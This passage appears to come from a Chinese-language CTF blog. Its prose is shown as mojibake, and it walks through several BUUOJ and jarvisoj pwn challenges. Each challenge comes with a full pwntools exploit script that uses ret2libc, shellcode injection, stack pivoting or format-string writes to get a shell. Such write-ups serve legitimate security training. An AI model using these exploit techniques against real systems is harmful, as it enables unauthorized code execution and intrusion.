<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/09/BAIuUsgEq8VkCD2.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­å­˜åœ¨æº¢å‡ºï¼Œä¸è¿‡æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆä½¿ç”¨printfæ³„éœ²readå‡½æ•°åœ°å€å†ç”¨LibcSearcherå¾—åˆ°libcæœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400731</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">fmtstr = <span class="number">0x400790</span></span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(read_got) +p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(fmtstr) + p64(printf_plt) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25106</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">str</span> = p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">read_addr = u64(<span class="built_in">str</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œå¾—åˆ°flag<del>è—çš„ä½ç½®å¥½æ·±å•Š</del></p>
<p><img src="https://i.loli.net/2020/10/09/L43Evc2IVdUWkCF.png" alt="F240_K_XDU@_4RS_JFVI~RP.png"></p>
<h2 id="0x01B-ez-pz-hackover-2016-ret2shellcode"><a href="#0x01B-ez-pz-hackover-2016-ret2shellcode" class="headerlink" title="0x01B.ez_pz_hackover_2016 - ret2shellcode"></a>0x01B.ez_pz_hackover_2016 - ret2shellcode</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œæš—ç¤ºæˆ‘ä»¬å¯ä»¥ä¸ºæ‰€æ¬²ä¸º</p>
<p><img src="https://i.loli.net/2021/01/28/wrpVQtRyPuC26Y7.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨<code>chall()</code>å‡½æ•°ä¸­ç»™æˆ‘ä»¬æ³„éœ²äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œå¹¶è¯»å…¥1023å­—èŠ‚ï¼Œæ— æ³•æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/11/30/nxCyhzXdESge4OH.png" alt="image.png"></p>
<p>ä½†æ˜¯åœ¨vulnå‡½æ•°ä¸­ä¼šæ‹·è´ä¸€æ¬¡æˆ‘ä»¬çš„è¾“å…¥ï¼Œ<strong>å¯ä»¥æº¢å‡º</strong></p>
<p><img src="https://i.loli.net/2020/11/30/ldt9YWcke8NvpUT.png" alt="image.png"></p>
<p>ç”±äºç»™äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘è¾“å…¥ä¸€æ®µshellcodeåè·³è½¬å³å¯</p>
<p>éœ€è¦æ³¨æ„çš„ä¸€ä¸ªç‚¹æ˜¯<code>vuln()</code>å‡½æ•°æ˜¯<strong>å°†ä¼ å…¥çš„å‚æ•°çš„åœ°å€ä½œä¸ºå‚æ•°ä¼ å…¥memcpyçš„</strong>ï¼Œæ•…å®é™…ä¸Šä¼šé¢å¤–æ‹·è´0xec - 0xd0 &#x3D; 0x1cå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¡«å……åˆ°ebpæ‰€éœ€çš„paddingé•¿åº¦å…¶å®åªéœ€è¦0x32 - 0x1c &#x3D; 0x16å­—èŠ‚</p>
<p><img src="https://i.loli.net/2021/01/28/lLxs4uqDPHd3Cp5.png"></p>
<p>æ³„éœ²å‡ºæ¥çš„åœ°å€å’Œæˆ‘ä»¬æ‹·è´åˆ°çš„åœ°å€ä¸Šçš„shellcodeé—´è·ä¸º0x9ec - 0x9d0 &#x3D; 0x1cï¼Œç›´æ¥è·³è½¬è¿‡å»å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å› ä¸ºmemcpyæ‹·è´äº†é•¿è¾¾0x400å­—èŠ‚çš„å†…å®¹ï¼Œä¼šå°†æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ•°æ®å°½æ•°ç ´åï¼Œæ•…æˆ‘ä»¬åªèƒ½å‘æ‹·è´åçš„åœ°å€è·³</strong></p>
<p><img src="https://i.loli.net/2020/12/01/tKG7EIMTbcS3wLa.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/11/30/n5M1HGzuTxy7QZb.png" alt="_9T8_GI__708_M0FN1H~_GC.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./ez_pz_hackover_2016&quot;</span>) <span class="comment">#  remote(&quot;node3.buuoj.cn&quot;, 25809) # </span></span><br><span class="line">offset = <span class="number">0x16</span></span><br><span class="line">verify = <span class="string">b&quot;crashme\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets crash: &quot;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;stack leak: &quot;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">payload = verify + <span class="string">b&#x27;A&#x27;</span> * (offset - <span class="built_in">len</span>(verify)) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(stack_leak - <span class="number">0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/12/01/P9gryD43xBNawEL.png" alt="image.png"></p>
<h2 id="0x01C-ciscn-2019-es-2-ret2text-stack-migration"><a href="#0x01C-ciscn-2019-es-2-ret2text-stack-migration" class="headerlink" title="0x01C.ciscn_2019_es_2 - ret2text + stack migration"></a>0x01C.ciscn_2019_es_2 - ret2text + stack migration</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/uifxqJUW9rIQpS1.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/Mdng1Imo6tPrkyC.png" alt="image.png"></p>
<p>å­˜åœ¨æº¢å‡ºï¼Œä¸”è¯»å–ä¸¤æ¬¡è¾“å‡ºä¸¤æ¬¡ï¼Œæ•…ç¬¬ä¸€æ¬¡æˆ‘ä»¬å¯ä»¥å¡«å……0x28å­—èŠ‚è·å¾—ä¸€ä¸ªæ ˆä¸Šåœ°å€</p>
<p><img src="https://i.loli.net/2020/12/01/MIteH4sl7aKJORj.png" alt="image.png"></p>
<p>å­˜åœ¨systemå‡½æ•°</p>
<p>ç”±äºæº¢å‡ºåªæœ‰8ä¸ªå­—èŠ‚ï¼Œè€Œæˆ‘ä»¬èƒ½å¤Ÿè·å¾—æ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘è¿›è¡Œ<strong>æ ˆè¿ç§»</strong>ï¼Œåœ¨æ ˆä¸Šæ„é€ ROPé“¾</p>
<p>é¢˜ç›®ä¸­åªç»™äº†<code>system()</code>å‡½æ•°ï¼Œæ²¡ç»™<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œä¸è¿‡ç”±äºæ ˆä¸Šåœ°å€å¯çŸ¥ï¼Œæ•…æˆ‘ä»¬å¯ä»¥å°†ä¹‹è¯»å–åˆ°æ ˆä¸Š</p>
<p>gdbè°ƒè¯•å¯çŸ¥æˆ‘ä»¬çš„è¾“å…¥ä¸æ‰€æ³„éœ²åœ°å€é—´è·ä¸º0xe18 - 0xde0 &#x3D; 0x38</p>
<p><img src="https://i.loli.net/2020/12/01/WXw721cUfC9LDqQ.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25040</span>) <span class="comment"># process(&quot;./ciscn_2019_es_2&quot;) #</span></span><br><span class="line">e = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">leave_ret = <span class="number">0x80485FD</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">payload2 = p32(e.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_leak-<span class="number">0x38</span> + <span class="number">12</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;A&#x27;</span> * (offset - <span class="built_in">len</span>(payload2)) + p32(stack_leak - <span class="number">0x38</span> - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/82JX5c3gmUfhuBd.png" alt="image.png"></p>
<h2 id="0x01D-Black-Watch-å…¥ç¾¤é¢˜-PWN-ret2libc-stack-migration"><a href="#0x01D-Black-Watch-å…¥ç¾¤é¢˜-PWN-ret2libc-stack-migration" class="headerlink" title="0x01D.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration"></a>0x01D.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/zX2NEbFpBKWCamq.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/9tqkz3s1byJDBId.png" alt="image.png"></p>
<p>ç¬¬ä¸€æ¬¡å¾€bssæ®µä¸Šè¯»å…¥0x200å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡å¾€æ ˆä¸Šè¯»å…¥0x20å­—èŠ‚ï¼Œ<strong>åªèƒ½åˆšå¥½æº¢å‡º8ä¸ªå­—èŠ‚</strong></p>
<p>æ•…è€ƒè™‘è¿›è¡Œæ ˆè¿ç§»å°†æ ˆè¿ç§»åˆ°bssæ®µä¸Š</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">29227</span>) <span class="comment"># process(&quot;./spwn&quot;) #</span></span><br><span class="line">e = ELF(<span class="string">&quot;./spwn&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x8048511</span></span><br><span class="line">payload1 = p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span> + p32(bss_addr - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload3 = p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What is your name?&quot;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/BGsMI7SmyxXAbLD.png" alt="image.png"></p>
<h2 id="0x01E-jarvisoj-level3-ret2libc"><a href="#0x01E-jarvisoj-level3-ret2libc" class="headerlink" title="0x01E.jarvisoj_level3 - ret2libc"></a>0x01E.jarvisoj_level3 - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/RVDX2UIegLHboN4.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/QZ9KJTgDafe3NMh.png" alt="image.png"></p>
<p>å­˜åœ¨120å­—èŠ‚çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level3&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26149)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/5lLM1IuKhdqHJwQ.png" alt="image.png"></p>
<blockquote>
<p>æ„Ÿè§‰ret2libcçš„é¢˜åŸºæœ¬éƒ½å¤§åŒå°å¼‚å•Šâ€¦</p>
</blockquote>
<h2 id="0x01F-jarvisoj-fm-fmtstr"><a href="#0x01F-jarvisoj-fm-fmtstr" class="headerlink" title="0x01F.jarvisoj_fm - fmtstr"></a>0x01F.jarvisoj_fm - fmtstr</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/01/NILo7xYAvaPjm9R.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img src="https://i.loli.net/2020/12/01/lJIRWsXmNeEP67B.png" alt="image.png"></p>
<p>å½“xä¸º4æ—¶ç›´æ¥getshellï¼Œxåœ¨bssæ®µä¸Š</p>
<p><img src="https://i.loli.net/2020/12/01/dzUnkYrhxHR5EiB.png" alt="image.png"></p>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨ç¬¬13ä¸ªå‚æ•°çš„ä½ç½®</p>
<p><img src="https://i.loli.net/2020/12/01/hDVSnkOyfovmQdL.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>,&#123;<span class="number">0x804A02C</span>:<span class="number">0x4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25865</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/u3UwrkKvGmgxW59.png" alt="image.png"></p>
<h2 id="0x020-jarvisoj-tell-me-something-ret2csu-ret2libc"><a href="#0x020-jarvisoj-tell-me-something-ret2csu-ret2libc" class="headerlink" title="0x020.jarvisoj_tell_me_something - ret2csu + ret2libc"></a>0x020.jarvisoj_tell_me_something - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/EbFBZKn2tPakdlg.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/ConYPhEF6378GWA.png" alt="image.png"></p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26270</span>)<span class="comment">#process(&#x27;./guestbook&#x27;) # </span></span><br><span class="line">e=  ELF(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006F3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006f1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(pop_rsi_r15_ret) + p64(e.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(e.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;I have received your message, Thank you!\n&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>* offset + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/4lBnGzRhCecZ28H.png" alt="image.png"></p>
<h1 id="0x021-0x030"><a href="#0x021-0x030" class="headerlink" title="0x021~0x030"></a>0x021~0x030</h1><h2 id="0x021-jarvisoj-level4-ret2libc"><a href="#0x021-jarvisoj-level4-ret2libc" class="headerlink" title="0x021.jarvisoj_level4 - ret2libc"></a>0x021.jarvisoj_level4 - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/tUa3TvpBgSWh4bR.png" alt="I1__E1AGMQCM8C3C__IR4_N.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/NVODiTzqfhtI1Hy.png" alt="image.png"></p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
